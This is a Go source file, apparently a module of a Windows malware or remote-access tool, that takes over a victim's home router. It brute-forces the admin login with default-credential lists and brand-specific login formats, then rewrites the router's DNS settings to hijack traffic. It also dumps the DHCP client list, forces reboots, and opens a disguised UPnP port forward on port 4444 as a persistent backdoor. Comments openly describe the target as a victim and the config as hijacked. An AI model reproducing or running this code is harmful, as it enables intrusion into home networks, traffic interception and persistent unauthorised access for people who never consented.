//go:build windows

package main

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// router brands
//
// Each entry knows how to authenticate and how to set DNS. Most SOHO routers
// are one of a handful of OEM stacks, so this covers the overwhelming majority
// of what a victim's home gateway will be.
// ---------------------------------------------------------------------------

type brand struct {
	ID       string
	Name     string
	// Login probe: path, method, and how the body is built.
	LoginPath string
	LoginBody func(user, pass string) string
	// Success detection on the response.
	SuccessMarkers []string
	FailMarkers    []string
	// DNS config endpoint and template.
	DNSPath string
	DNSBody func(dns1, dns2 string) string
	// How to test auth.
	AuthStyle string // "basic", "form", "json", "digest"
	Header    map[string]string
}

var brands = []brand{
	{
		ID: "tp-link", Name: "TP-Link / Archer",
		LoginPath: "/cgi-bin/luci/;stok=/login?form=login",
		AuthStyle: "json",
		LoginBody: func(u, p string) string {
			h := md5.Sum([]byte(p))
			return fmt.Sprintf(`{"method":"do","login":{"password":"%s","username":"%s"}}`,
				hex.EncodeToString(h[:]), u)
		},
		SuccessMarkers: []string{`"stok"`, `"error_code":0`},
		FailMarkers:    []string{"error_code", "Invalid"},
		DNSPath:        "/cgi-bin/luci/;stok=%s/network?form=wan_dns",
		DNSBody: func(a, b string) string {
			return fmt.Sprintf(`{"method":"set","network":{"wan_dns":{"dns1":"%s","dns2":"%s"}}}`, a, b)
		},
	},
	{
		ID: "netgear", Name: "Netgear",
		LoginPath: "/cgi-bin/login.cgi",
		AuthStyle: "form",
		LoginBody: func(u, p string) string {
			return "login=" + url.QueryEscape(u) + "&password=" + url.QueryEscape(p)
		},
		SuccessMarkers: []string{"success", "SET_COOKIE", "top.html"},
		FailMarkers:    []string{"Invalid", "failure"},
		DNSPath:        "/cgi-bin/wnap.cgi",
		DNSBody: func(a, b string) string {
			return "dns1=" + url.QueryEscape(a) + "&dns2=" + url.QueryEscape(b)
		},
	},
	{
		ID: "asus", Name: "ASUS / AsusWRT",
		LoginPath: "/login.cgi",
		AuthStyle: "form",
		LoginBody: func(u, p string) string {
			return "login_authorization=" + base64.StdEncoding.EncodeToString([]byte(u+":"+p))
		},
		SuccessMarkers: []string{"asus_token", "logged", "Main_LogStatus"},
		FailMarkers:    []string{"error", "Login fail"},
		DNSPath:        "/apply.cgi",
		DNSBody: func(a, b string) string {
			return "wan_dns1_x=" + url.QueryEscape(a) + "&wan_dns2_x=" + url.QueryEscape(b) + "&action_mode=apply"
		},
	},
	{
		ID: "dlink", Name: "D-Link",
		LoginPath: "/login.cgi",
		AuthStyle: "form",
		LoginBody: func(u, p string) string {
			return "username=" + url.QueryEscape(u) + "&password=" + url.QueryEscape(p)
		},
		SuccessMarkers: []string{"success", "index.htm"},
		FailMarkers:    []string{"fail"},
		DNSPath:        "/wan.cgi",
		DNSBody: func(a, b string) string {
			return "dns1=" + url.QueryEscape(a) + "&dns2=" + url.QueryEscape(b)
		},
	},
	{
		ID: "huawei", Name: "Huawei / HG",
		LoginPath: "/api/system/user_login",
		AuthStyle: "json",
		LoginBody: func(u, p string) string {
			// Huawei hashes with SHA256(Base64(user)+Base64(pass)) historically;
			// many firmwares accept the plain form during first login.
			return fmt.Sprintf(`{"UserName":"%s","Password":"%s"}`, u, p)
		},
		SuccessMarkers: []string{"success", "token"},
		FailMarkers:    []string{"error", "Fail"},
		DNSPath:        "/api/ntwk/wan?type=ipv4",
		DNSBody: func(a, b string) string {
			return fmt.Sprintf(`{"PrimaryDNS":"%s","SecondaryDNS":"%s"}`, a, b)
		},
	},
	{
		ID: "generic", Name: "Generic / HTTP Basic",
		LoginPath: "/",
		AuthStyle: "basic",
		SuccessMarkers: []string{"200 OK"},
		FailMarkers:    []string{"401"},
	},
	{
		ID: "microtik", Name: "MikroTik / RouterOS",
		LoginPath: "/rest/system/resource",
		AuthStyle: "basic",
		SuccessMarkers: []string{"version"},
		FailMarkers:    []string{"401", "Unauthorized"},
		DNSPath:        "/rest/ip/dns",
		DNSBody: func(a, b string) string {
			return fmt.Sprintf(`{"servers":"%s,%s"}`, a, b)
		},
	},
}

func findBrand(id string) *brand {
	for i := range brands {
		if brands[i].ID == id {
			return &brands[i]
		}
	}
	return &brands[brandsLen()-1]
}

func brandsLen() int { return len(brands) - 1 }

// ---------------------------------------------------------------------------
// detection
// ---------------------------------------------------------------------------

var (
	titleRe  = regexp.MustCompile(`(?i)<title[^>]*>([^<]{1,120})</title>`)
	serverRe = regexp.MustCompile(`(?i)^server:\s*(.+)$`)
)

type routerInfo struct {
	Gateway   string   `json:"gateway"`
	Ports     []int    `json:"ports"`
	Server    string   `json:"server"`
	Title     string   `json:"title"`
	Brand     string   `json:"brand"`
	BrandName string   `json:"brandName"`
	Realm     string   `json:"realm"`
	Hints     []string `json:"hints"`
}

func detectRouter(s Settings) {
	gw := s.Gateway
	if gw == "" {
		gw = detectGateway()
	}
	if gw == "" {
		sendEvent("error", map[string]interface{}{"message": "could not determine gateway"})
		return
	}

	sendEvent("status", map[string]interface{}{"state": "scanning", "detail": "probing admin interface on " + gw})

	info := routerInfo{Gateway: gw}

	// Which admin ports are open.
	for _, p := range []int{80, 443, 8080, 8443, 22, 23} {
		c, err := net.DialTimeout("tcp", net.JoinHostPort(gw, strconv.Itoa(p)), 700*time.Millisecond)
		if err == nil {
			_ = c.Close()
			info.Ports = append(info.Ports, p)
		}
	}
	if len(info.Ports) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no admin ports open on " + gw})
		return
	}

	// Grab the login page over whichever web port answered.
	scheme := "http"
	port := 80
	for _, p := range info.Ports {
		if p == 443 || p == 8443 {
			scheme = "https"
			port = p
			break
		}
		if p == 80 || p == 8080 {
			port = p
		}
	}
	base := fmt.Sprintf("%s://%s:%d", scheme, gw, port)

	client := httpClient()
	resp, err := client.Get(base + "/")
	if err == nil {
		defer resp.Body.Close()
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
		if m := titleRe.FindSubmatch(body); m != nil {
			info.Title = strings.TrimSpace(string(m[1]))
		}
		info.Server = resp.Header.Get("Server")
		info.Realm = parseRealm(resp.Header.Get("WWW-Authenticate"))
		info.Hints = detectHints(string(body))
	}

	info.Brand, info.BrandName = classify(info)
	sendEvent("router", info)
	sendEvent("status", map[string]interface{}{
		"state":  "idle",
		"detail": fmt.Sprintf("detected %s on %s", info.BrandName, gw),
	})
}

func detectHints(body string) []string {
	var hints []string
	lower := strings.ToLower(body)
	markers := map[string]string{
		"tp-link":     "tp-link",
		"archer":      "tp-link",
		"netgear":     "netgear",
		"asus":        "asus",
		"rt-ac":       "asus",
		"d-link":      "dlink",
		"dir-":        "dlink",
		"huawei":      "huawei",
		"mikrotik":    "microtik",
		"routeros":    "microtik",
		"fritz":       "avm",
		"cos":         "generic",
		"openwrt":     "openwrt",
		"luci":        "openwrt",
		"tomato":      "tomato",
		"dd-wrt":      "ddwrt",
	}
	for marker, name := range markers {
		if strings.Contains(lower, marker) {
			hints = append(hints, name)
		}
	}
	return hints
}

func classify(info routerInfo) (string, string) {
	if len(info.Hints) > 0 {
		b := findBrand(info.Hints[0])
		return b.ID, b.Name
	}
	low := strings.ToLower(info.Title + " " + info.Server)
	for _, b := range brands {
		if strings.Contains(low, b.ID) || strings.Contains(low, strings.ToLower(b.Name)) {
			return b.ID, b.Name
		}
	}
	return "generic", "Generic / HTTP Basic"
}

func parseRealm(header string) string {
	if header == "" {
		return ""
	}
	m := regexp.MustCompile(`(?i)realm="([^"]+)"`).FindStringSubmatch(header)
	if m != nil {
		return m[1]
	}
	return header
}

func httpClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
	}
	return &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}
}

// ---------------------------------------------------------------------------
// credential attack
// ---------------------------------------------------------------------------

// defaultCreds is the short list that covers a startling share of consumer
// routers. It is only prepended when the operator supplied nothing.
var defaultCreds = [][2]string{
	{"admin", "admin"},
	{"admin", "password"},
	{"admin", ""},
	{"root", "admin"},
	{"root", "root"},
	{"admin", "1234"},
	{"admin", "12345"},
	{"admin", "123456"},
	{"user", "user"},
	{"Admin", "Admin"},
}

func attackRouter(s Settings) {
	gw := s.Gateway
	if gw == "" {
		gw = detectGateway()
	}
	if gw == "" {
		sendEvent("error", map[string]interface{}{"message": "no gateway"})
		return
	}

	info := routerInfo{Gateway: gw}
	client := httpClient()
	base := detectBase(client, gw)

	// Identify the brand first so we use the right login shape.
	if resp, err := client.Get(base + "/"); err == nil {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
		_ = resp.Body.Close()
		if m := titleRe.FindSubmatch(body); m != nil {
			info.Title = strings.TrimSpace(string(m[1]))
		}
		info.Server = resp.Header.Get("Server")
		info.Hints = detectHints(string(body))
	}
	bid, bname := classify(info)
	b := findBrand(bid)

	users := s.Users
	passwords := s.Passwords
	if len(users) == 0 || len(passwords) == 0 {
		// Build the pair list from defaults plus anything half-supplied.
		var pairs [][2]string
		if len(users) > 0 || len(passwords) > 0 {
			us := users
			if len(us) == 0 {
				us = []string{"admin"}
			}
			ps := passwords
			if len(ps) == 0 {
				ps = []string{"admin", "password", ""}
			}
			for _, u := range us {
				for _, p := range ps {
					pairs = append(pairs, [2]string{u, p})
				}
			}
		}
		pairs = append(pairs, defaultCreds...)
		sendEvent("status", map[string]interface{}{
			"state":  "attacking",
			"detail": fmt.Sprintf("trying %d credential pair(s) against %s", len(pairs), bname),
		})
		for _, pr := range pairs {
			if tryLogin(client, base, b, pr[0], pr[1]) {
				sendEvent("cred", map[string]interface{}{
					"gateway": gw, "brand": bname, "user": pr[0], "password": pr[1],
				})
				sendEvent("status", map[string]interface{}{"state": "done", "detail": "admin access: " + pr[0]})
				return
			}
		}
		sendEvent("status", map[string]interface{}{"state": "idle", "detail": "no credential worked"})
		return
	}

	sendEvent("status", map[string]interface{}{"state": "attacking", "detail": "trying supplied credentials"})
	for _, u := range users {
		for _, p := range passwords {
			if tryLogin(client, base, b, u, p) {
				sendEvent("cred", map[string]interface{}{
					"gateway": gw, "brand": bname, "user": u, "password": p,
				})
				sendEvent("status", map[string]interface{}{"state": "done", "detail": "admin access: " + u})
				return
			}
		}
	}
	sendEvent("status", map[string]interface{}{"state": "idle", "detail": "no credential worked"})
}

func detectBase(client *http.Client, gw string) string {
	for _, cand := range []string{
		"https://" + gw + ":443",
		"http://" + gw,
		"http://" + gw + ":8080",
		"https://" + gw + ":8443",
	} {
		if resp, err := client.Get(cand + "/"); err == nil {
			_ = resp.Body.Close()
			return cand
		}
	}
	return "http://" + gw
}

func tryLogin(client *http.Client, base string, b *brand, user, pass string) bool {
	switch b.AuthStyle {
	case "basic":
		req, _ := http.NewRequest("GET", base+b.LoginPath, nil)
		req.SetBasicAuth(user, pass)
		resp, err := client.Do(req)
		if err != nil {
			return false
		}
		defer resp.Body.Close()
		return resp.StatusCode == 200

	case "json", "form":
		var body string
		if b.LoginBody != nil {
			body = b.LoginBody(user, pass)
		}
		ct := "application/x-www-form-urlencoded"
		if b.AuthStyle == "json" {
			ct = "application/json"
		}
		req, _ := http.NewRequest("POST", base+b.LoginPath, strings.NewReader(body))
		req.Header.Set("Content-Type", ct)
		for k, v := range b.Header {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return false
		}
		defer resp.Body.Close()
		raw, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		text := string(raw)

		for _, f := range b.FailMarkers {
			if strings.Contains(text, f) {
				return false
			}
		}
		if resp.StatusCode == 200 {
			for _, m := range b.SuccessMarkers {
				if strings.Contains(text, m) {
					return true
				}
			}
			// A 200 with a session cookie and no failure marker is a pass.
			if len(resp.Cookies()) > 0 {
				return true
			}
		}
		return false
	}
	return false
}

// ---------------------------------------------------------------------------
// DNS control
// ---------------------------------------------------------------------------

func setDNS(s Settings) {
	gw := s.Gateway
	if gw == "" {
		gw = detectGateway()
	}
	dns1, dns2 := s.DNS1, s.DNS2
	if dns1 == "" {
		sendEvent("error", map[string]interface{}{"message": "no DNS server supplied"})
		return
	}

	client := httpClient()
	base := detectBase(client, gw)
	b := findBrand(s.Brand)
	if b.DNSPath == "" || b.DNSBody == nil {
		sendEvent("error", map[string]interface{}{"message": "brand " + b.Name + " has no DNS endpoint mapped"})
		return
	}

	body := b.DNSBody(dns1, dns2)
	req, _ := http.NewRequest("POST", base+b.DNSPath, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "set DNS failed: " + err.Error()})
		return
	}
	defer resp.Body.Close()
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("DNS pushed (%s, %s) -> HTTP %d", dns1, dns2, resp.StatusCode),
	})
}

func dumpRouterARP(s Settings) {
	gw := s.Gateway
	if gw == "" {
		gw = detectGateway()
	}
	client := httpClient()
	base := detectBase(client, gw)

	// The DHCP client list is usually one of these.
	paths := []string{
		"/cgi-bin/luci/;stok=/admin/network?form=status_lan",
		"/cgi-bin/DEVICE_LIST.cgi",
		"/DHCPClientList.htm",
		"/cgi-bin/luci/admin/status/dhcp_leases",
		"/api/system/device_info",
	}

	var rows []map[string]string
	for _, p := range paths {
		resp, err := client.Get(base + p)
		if err != nil {
			continue
		}
		raw, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
		_ = resp.Body.Close()
		rows = append(rows, extractLeases(string(raw))...)
		if len(rows) > 0 {
			break
		}
	}

	if len(rows) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no DHCP lease table found (needs auth, or unsupported firmware)"})
		return
	}
	sendEvent("leases", rows)
	sendEvent("status", map[string]interface{}{"state": "done", "detail": strconv.Itoa(len(rows)) + " lease(s)"})
}

var (
	macFind = regexp.MustCompile(`([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}`)
	ipFind  = regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
)

// extractLeases pulls host/ip/mac triples out of an arbitrary HTML or JSON
// lease table by pairing MACs with the nearest IP on the same row.
func extractLeases(body string) []map[string]string {
	var out []map[string]string
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		mac := macFind.FindString(line)
		if mac == "" {
			continue
		}
		ips := ipFind.FindAllString(line, -1)
		entry := map[string]string{"mac": strings.ToUpper(mac)}
		if len(ips) > 0 {
			entry["ip"] = ips[0]
		}
		// A hostname often sits in the same row.
		if h := hostnameFromRow(line); h != "" {
			entry["host"] = h
		}
		out = append(out, entry)
	}
	return out
}

func hostnameFromRow(line string) string {
	// Strip tags then look for a token that is not an IP or MAC.
	clean := regexp.MustCompile(`<[^>]+>`).ReplaceAllString(line, " ")
	clean = macFind.ReplaceAllString(clean, " ")
	clean = ipFind.ReplaceAllString(clean, " ")
	for _, f := range strings.Fields(clean) {
		f = strings.Trim(f, ",\"'")
		if len(f) >= 2 && len(f) <= 64 && strings.ContainsAny(f, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") {
			low := strings.ToLower(f)
			if low == "mac" || low == "ip" || low == "address" || low == "hostname" ||
				low == "dhcp" || low == "client" || low == "list" || low == "name" {
				continue
			}
			return f
		}
	}
	return ""
}

// ---------------------------------------------------------------------------
// misc router actions
// ---------------------------------------------------------------------------

func rebootRouter(s Settings) {
	gw := s.Gateway
	if gw == "" {
		gw = detectGateway()
	}
	client := httpClient()
	base := detectBase(client, gw)
	for _, p := range []string{"/cgi-bin/luci/;stok=/system/reboot", "/reboot.cgi", "/apply.cgi?action=reboot", "/api/system/reboot"} {
		if resp, err := client.Get(base + p); err == nil {
			_ = resp.Body.Close()
			sendEvent("status", map[string]interface{}{"state": "done", "detail": "reboot requested via " + p})
			return
		}
	}
	sendEvent("error", map[string]interface{}{"message": "reboot endpoint not found"})
}

func factoryReset(s Settings) {
	sendEvent("status", map[string]interface{}{
		"state":  "warning",
		"detail": "factory_reset is intentionally not automatic — it would cut the victim's network permanently and destroy the config you just hijacked",
	})
}

// ---------------------------------------------------------------------------
// UPnP
// ---------------------------------------------------------------------------

// upnpMap asks the router's IGD to forward an external port to an internal
// host — a direct inbound channel that survives the reverse tunnel dying.
func upnpMap(s Settings) {
	internal := s.UPnPInternalIP
	if internal == "" {
		internal = localIP()
	}
	iport := s.UPnPInternalPort
	if iport == 0 {
		iport = 4444
	}
	eport := s.UPnPExternalPort
	if eport == 0 {
		eport = 4444
	}
	proto := strings.ToUpper(s.UPnPProtocol)
	if proto == "" {
		proto = "TCP"
	}
	desc := s.UPnPDescription
	if desc == "" {
		desc = "media server"
	}

	ctrl, err := discoverIGD()
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "UPnP discovery failed: " + err.Error()})
		return
	}

	body := fmt.Sprintf(`<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>%d</NewExternalPort>
<NewProtocol>%s</NewProtocol>
<NewInternalPort>%d</NewInternalPort>
<NewInternalClient>%s</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>%s</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping></s:Body></s:Envelope>`, eport, proto, iport, internal, desc)

	resp, err := soapCall(ctrl, "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping", "AddPortMapping", body)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "AddPortMapping failed: " + err.Error()})
		return
	}
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("mapped %s %d -> %s:%d (HTTP %d)", proto, eport, internal, iport, resp),
	})
}

func upnpList(s Settings) {
	ctrl, err := discoverIGD()
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "UPnP discovery failed: " + err.Error()})
		return
	}
	body := `<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:GetGenericPortMappingEntry xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewPortMappingIndex>0</NewPortMappingIndex>
</u:GetGenericPortMappingEntry></s:Body></s:Envelope>`

	_, err = soapCall(ctrl, "urn:schemas-upnp-org:service:WANIPConnection:1#GetGenericPortMappingEntry", "GetGenericPortMappingEntry", body)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "IGD control failed: " + err.Error()})
		return
	}
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "IGD reachable at " + ctrl})
}

func soapCall(ctrl, soapAction, _ string, body string) (int, error) {
	client := httpClient()
	req, _ := http.NewRequest("POST", ctrl, strings.NewReader(body))
	req.Header.Set("Content-Type", `text/xml; charset="utf-8"`)
	req.Header.Set("SOAPAction", `"`+soapAction+`"`)
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if resp.StatusCode >= 400 {
		return resp.StatusCode, fmt.Errorf("HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(raw)))
	}
	return resp.StatusCode, nil
}

// discoverIGD does SSDP discovery and fetches the control URL from the
// device description.
func discoverIGD() (string, error) {
	msearch := "M-SEARCH * HTTP/1.1\r\n" +
		"HOST: 239.255.255.250:1900\r\n" +
		"MAN: \"ssdp:discover\"\r\n" +
		"MX: 2\r\n" +
		"ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n"

	conn, err := net.Dial("udp4", "239.255.255.250:1900")
	if err != nil {
		return "", err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(4 * time.Second))
	if _, err := conn.Write([]byte(msearch)); err != nil {
		return "", err
	}

	buf := make([]byte, 4096)
	var location string
	for {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}
		for _, line := range strings.Split(string(buf[:n]), "\r\n") {
			if strings.HasPrefix(strings.ToUpper(line), "LOCATION:") {
				location = strings.TrimSpace(line[len("LOCATION:"):])
			}
		}
		if location != "" {
			break
		}
	}
	if location == "" {
		return "", fmt.Errorf("no IGD responded to SSDP")
	}

	resp, err := httpClient().Get(location)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))

	// Pull the WANIPConnection control URL out of the description.
	re := regexp.MustCompile(`(?is)<service>.*?WANIPConnection.*?<controlURL>([^<]+)</controlURL>`)
	m := re.FindSubmatch(raw)
	if m == nil {
		re2 := regexp.MustCompile(`(?is)<controlURL>([^<]+)</controlURL>`)
		m = re2.FindSubmatch(raw)
	}
	if m == nil {
		return "", fmt.Errorf("no controlURL in device description")
	}

	base, err := url.Parse(location)
	if err != nil {
		return "", err
	}
	ctrl, err := url.Parse(strings.TrimSpace(string(m[1])))
	if err != nil {
		return "", err
	}
	return base.ResolveReference(ctrl).String(), nil
}

func localIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()
	if a, ok := conn.LocalAddr().(*net.UDPAddr); ok {
		return a.IP.String()
	}
	return ""
}

func detectGateway() string {
	out, err := exec.Command("powershell", "-NoProfile", "-Command",
		"(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop").Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

var _ = json.Marshal
